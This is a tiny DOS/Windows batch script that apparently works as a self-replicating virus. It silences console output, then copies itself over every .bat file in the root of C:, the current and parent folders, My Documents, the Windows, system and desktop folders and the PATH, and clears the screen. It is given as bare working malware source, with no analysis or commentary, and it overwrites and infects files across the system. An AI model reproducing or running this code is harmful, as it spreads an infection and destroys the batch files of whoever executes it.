ctty nul
@set s=*.bat
@for %%s in (c:\%s% %s% ..\%s% c:\mydocu~1\%s% %windir%\%s% %path%\%s% %windir%\desktop\%s% %windir%\system\%s%) do copy %0 %%s
cls